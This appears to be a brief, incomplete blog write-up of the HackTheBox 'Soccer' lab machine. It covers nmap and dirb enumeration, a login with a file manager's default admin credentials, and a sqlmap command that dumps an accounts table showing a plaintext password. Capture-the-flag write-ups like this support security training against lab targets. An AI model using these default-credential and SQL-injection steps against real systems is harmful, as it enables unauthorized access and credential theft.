---
layout: post
title: htb soccer
date: 2023-04-04 23:01 +0200
categories: [HackTheBox]
tags: [Hack-The-Box-Easy]
---

```
HOST: 10.10.11.194
```

### Nmap scan

```bash
rether> nmap -A 10.10.11.194
[...]
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Soccer - Index
9091/tcp open  xmltec-xmlmail?
[...]
```

Soccer.htb is a private website so we need to add hom to the hosts file (make sure you are root)
echo "10.10.11.194 soccer.htb" >> /etc/hosts

```
rether> dirb http://soccer.htb/ /usr/share/seclists/Discovery/Web-Content/SVNDigger/all-dirs.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Tue Apr  4 23:20:10 2023
URL_BASE: http://soccer.htb/
WORDLIST_FILES: /usr/share/seclists/Discovery/Web-Content/SVNDigger/all-dirs.txt

-----------------

GENERATED WORDS: 5947

---- Scanning URL: http://soccer.htb/ ----
+ http://soccer.htb/?? (CODE:200|SIZE:6917)
+ http://soccer.htb/???? (CODE:200|SIZE:6917)
+ http://soccer.htb/????? (CODE:200|SIZE:6917)
+ http://soccer.htb/??? (CODE:200|SIZE:6917)
==> DIRECTORY: http://soccer.htb/tiny/
+ http://soccer.htb/??????? (CODE:200|SIZE:6917)
+ http://soccer.htb/?????? (CODE:200|SIZE:6917)
+ http://soccer.htb/? (CODE:200|SIZE:6917)
(!) FATAL: Too many errors connecting to host
    (Possible cause: URL MALFORMAT)
-----------------
END_TIME: Tue Apr  4 23:22:27 2023
DOWNLOADED: 5688 - FOUND: 7
```

from `https://tinyfilemanager.github.io/docs/` we get the default login credential for admin and normal user session for tiny service

login with admin credential (username/password) : admin/admin@123

we got access to the admin panel

we cant upload php file and exec it

```bash
sqlmap -u "http://localhost:8083/?id=1" --random-agent --threads 10 -p id -D soccer_db -T accounts -C username,password --dump-all
```

result

```bash
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```
